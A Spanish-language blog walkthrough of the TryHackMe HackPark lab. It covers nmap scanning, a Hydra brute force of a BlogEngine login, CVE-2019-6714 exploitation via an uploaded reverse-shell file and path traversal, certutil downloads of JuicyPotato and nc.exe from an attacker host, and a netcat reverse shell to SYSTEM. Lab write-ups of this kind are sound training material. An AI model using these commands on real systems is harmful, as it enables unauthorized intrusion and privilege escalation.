---
layout: single
title: Máquina HackPark - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La máquina HackPark es una máquina Windows que en TryHackMe piden resolver por medio de Metasploit y de manera manual. Ambas resoluciones se hacen de una forma en la plataforma, sin embargo, aquí lo resolveremos de la manera no intencionada para repasar conceptos de máquinas anteriores."
date: 2022-02-07
classes: wide
header:
  teaser: /assets/images/hackpark/portada.png
  teaser_home_page: true
categories:
  - THM
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

# Información de la máquina
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/hackpark) y su resolución se hace por medio de Metasploit y de manera manual siguiendo las indicaciones de la plataforma. Sin embargo, no hay instrucciones detalladas para efectuar el exploit del servidor web. Además, efectuaremos la escalada de privilegios por otro medio no intencionado con el propósito de repasar cosas que ya hemos visto en máquinas anteriores y ver otros métodos nuevos.

# Reconocimiento
La máquina tiene un sistema operativo Windows, información que nos da TryHackMe. Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap --min-rate 5000 -p- --open -vv -Pn -n 10.10.10.243 -oN portScan

![1]

Vemos que se encuentran habilitados tres puertos: el 80 (HTTP), el 3389 y el 5989 (que de momento desconocemos).

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

	nmap -sC -sV -p80,3389,5989 10.10.10.243 -oN targeted

![2]

Vemos que hay dos servidores HTTP. En el caso del primero, vemos que cuenta con varias entradas deshabilitadas en el **robots.txt**, por lo que deberemos revisarlas posteriormente. El segundo servidor HTTP dice correr con Microsoft HTTPAPI, sin embargo, **nmap** no puede encontrar más información sobre este.

# Servicio HTTP
El primer servicio HTTP en el puerto 80 es una página web que muestra una imágen de l payaso Pennywise.

![3]

Si comenzamos a navegar por la página, veremos que hay varios sitios como uno de contacto. Sería buena idea intentar inyecciones, pero seguiremos investigando.

![4]

Hay una página con un portal de logueo a algo llamado **blogengine**, y cabe destacar que este solo aparece en el menú desplegable desde el sitio índice. Si nos fijamos en la **URL**, veremos que contiene un subdirectorio **Account** (el mismo que aparecía en el robots.txt descubierto durante el escaneo con **nmap**).

![5]

Se intentó con credenciales por defecto típicas como pueden ser:

	admin:password
	admin:admin
	admin:pass

Sin embargo, ninguna funcionó.

# Fuerza bruta contra el panel de logueo
Para proseguir, haremos un ataque de fuerza bruta contra el panel de logueo empleando **Hydra**, y para ello necesitamos saber cómo se llaman las variables que viajan por medio de la petición al servidor web. Interceptamos una petición con ayuda de BurpSuite.

![6]

Vemos que la petición se hace por medio de **POST** junto con una serie de variables bastante extensas. Esta última parte señalada es la que deberemos copiar para emplearla en **Hydra**.

	hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.243 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:VARIABLES_DEL_BURPSUITE:Login failed"
	
Donde:
- -l es el usuario 'admin'. Este usuario es válido en el panel de logueo porque es por defecto, así que solo queremos averiguar la contraseña.
- -P es el diccionario a usar para las contraseñas. En este caso, el **rockyou**.
- Sigue la IP del servidor web.
- http-post-form le indica a Hydra que la petición se realiza por medio de POST.
- Entre paréntesis van tres secciones que Hydra necesita para efectuar las peticiones:
	- La primera es la parte de la URL donde se va a hacer la petición POST. En este caso /Account/login.aspx?ReturnURL=%2fadmin%2f
	- La segunda parte son las variables de la petición que copiamos de Burpsuite. Ahí deberemos sustituir la parte de usuario y contraseña hardcodeadas por las variables **^USER^** y **^PASS^** como se ve en la imagen de abajo.
	- La última parte es el mensaje que **Hydra** debe identificar en la respuesta para saber que la petición fue incorrecta. En nuestro caso, cuando nos logueamos con credenciales incorrectas, la página web nos devuelve un mensaje que dice **Login failed**.

![7]

Después de un tiempo, veremos que el programa nos devuelve la contraseña correcta para loguearnos:

![8]

# Acceso a blogengine
Si nos logueamos con las credenciales obtenidas, veremos que logramos acceder al panel de administración del servicio **blogengine**.

![9]

El siguiente objetivo es buscar la forma de explotar alguna vulnerabilidad dentro de este servicio, por lo que buscamos con **searchsploit** vulnerabilidades conocidas para la versión 3.3.6 de **blogengine** (la versión se puede conocer desde el botón **About** del menu lateral izquierdo de **blogengine**).

![10]

Este nos devuelve algunas, y para la versión específica del servicio. La que vamos a usar es la que se encuentra marcada. Fuera de cámara se intentaron los demás exploits que son más automatizados, sin embargo, ninguno de ellos funcionó correctamente, me tocará ver después el porqué.

Este exploit requiere de varios pasos manuales, por lo que vamos a revisarlos uno por uno.

# Explotación del CVE-2019-6714
Si analizamos el script proporcionado, veremos las instrucciones que debemos seguir. Sin embargo, pudieran no ser lo suficientemente explicativas. Lo primero que debemos hacer es modificar la IP y el puerto al que se conectará una reverse shell desde el servidor hasta nosotros. Es decir, debes colocar tu IP y puerto de atacante desde donde estarás a la escucha con **netcat**.

![11]

Nota: No tomé captura de en dónde se colocan, pero en el mismo script podrás ver la leyenda **TcpClient** junto con una IP y un puerto. Son los únicos en todo el código, así que no debería haber problema.
	
Ya habiendo modificado estos parámetros, deberemos ir a la página web (ya logueados como **admin**) y seleccionar **Published posts**:
	
![12]

Ahora deberemos seleccionar un post publicado. Como en este caso solo hay uno, hacemos clic en él:

![13]

Esto nos permitirá editar la página web inicial del servidor (aquella donde aparece Pennywise). Deberemos hacer clic en el ícono de carpeta que se ve en la siguiente imagen:

![14]

Esto nos permitirá añadir nuestro sccript malicioso al sitio web (una especie de subida de archivos no controlada). Para ello, deberemos guardar nuestro código con el nombre: **PostView.ascx** como lo indican las instrucciones:

![15]

Posteriormente, en el sitio web, deberemos hacer clic en **Upload**.

![16]

Aquí deberás escojer el script malicioso al que le cambiaste el nombre (PostView.ascx). Una vez hecho esto, deberá aparecerte de la siguiente forma:

![17]

Puedes cerrar esta ventana emergente con la X de la esquina superior derecha (la de **File manager**). Por último, deberás guardar los cambios con el botón de **Save**:

![18]

Por último, solo deberemos ir a la ruta que nos marcan las instrucciones:

	http://IP/?theme=../../App_Data/files
	
![19]
	
Esto efectuará un path traversal que nos permitirá acceder al archivo malicioso que acabamos de subir. Por ello, antes de dirigirnos a esta página ya deberemos tener un **netcat** a la escucha. Visitamos el sitio web y veremos que casi inmediatamente recibimos la reverse shell en nuestra consola con **netcat**.

![20]

![21]

# Escalada de privilegios
La shell recibida es bastante inestable y no devuelve un prompt sino hasta después de ejecutado un comando, por lo que debemos tener cuidado. Recuerda que si llegas a perder la shell por un CTRL+C no intencionado, solo basta con repetir el proceso de ponerse en escucha y volver a visitar el sitio web.

Enumeramos ahora los privilegios con los que cuenta nuestro usuario actual:

	whoami /priv
	
![22]

Nuevamente nos encontramos ante un **SeImpersonatePrivilege**, y como vimos en la máquina pasada, solo requerimos del **JuicyPotato** y de un binario de **netcat** para Windows. Para una explicación más detallada de esta vulnerabilidad, te recomiendo revisar la resolución de la [máquina Alfred](https://blu3ming.github.io/maquina-alfred-walkthrough/).

Como en esta ocasión nos encontramos en una **cmd** y no en una **PowerShell**, el proceso de copiar los archivos en la máquina víctima se debe hacer por medio de **certutil**.

	certutil.exe -urlcache -split -f http://10.10.169.158:8080/JP.exe JP.exe
	certutil.exe -urlcache -split -f http://10.10.169.158:8080/nc.exe nc.exe

Recuerda, este proceso de copiar a la máquina víctima requiere que coloques los binarios en un servidor HTTP con Python. Adicionalmente, recuerda que el **nc.exe** está presente en cualquier distribución de Linux para pentesting, y puede localizarse con el comando:

	locate nc.exe
	
![23]

Finalmente, ejecutamos el **JuicyPotato** como de costumbre:

	./JP.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\privesc\nc.exe -e cmd.exe 10.10.169.158 443" -t *

Nuevamente hemos colocado los binarios en un directorio personalizado con permisos de escritura dentro del directorio **Temp** de Windows. Olvidé mencionar en la máquina pasada que el puerto de el servidor COM es casi siempre por defecto 1337, así que puedes seguir usándolo aquí también.	

Antes de ejecutarlo, ya debemos estar en otra consola a la escucha con **netcat** para recibir la reverse shell. Al ejecutarlo, si vemos que la salida finaliza con un **OK**, significa que la herramienta se ejecutó correctamente.

![24]

Como podemos observar, recibimos la shell como un usuario privilegiado del sistema:

![25]

# Flags
Para finalizar la máquina, simplemente mostramos las flags tanto de usuario como de root y su ubicación dentro del sistema.

![26]

[1]:/assets/images/hackpark/1.png
[2]:/assets/images/hackpark/2.png
[3]:/assets/images/hackpark/3.png
[4]:/assets/images/hackpark/4.png
[5]:/assets/images/hackpark/5.png
[6]:/assets/images/hackpark/6.png
[7]:/assets/images/hackpark/7.png
[8]:/assets/images/hackpark/8.png
[9]:/assets/images/hackpark/9.png
[10]:/assets/images/hackpark/10.png
[11]:/assets/images/hackpark/11.png
[12]:/assets/images/hackpark/12.png
[13]:/assets/images/hackpark/13.png
[14]:/assets/images/hackpark/14.png
[15]:/assets/images/hackpark/15.png
[16]:/assets/images/hackpark/16.png
[17]:/assets/images/hackpark/17.png
[18]:/assets/images/hackpark/18.png
[19]:/assets/images/hackpark/19.png
[20]:/assets/images/hackpark/20.png
[21]:/assets/images/hackpark/21.png
[22]:/assets/images/hackpark/22.png
[23]:/assets/images/hackpark/23.png
[24]:/assets/images/hackpark/24.png
[25]:/assets/images/hackpark/25.png
[26]:/assets/images/hackpark/26.png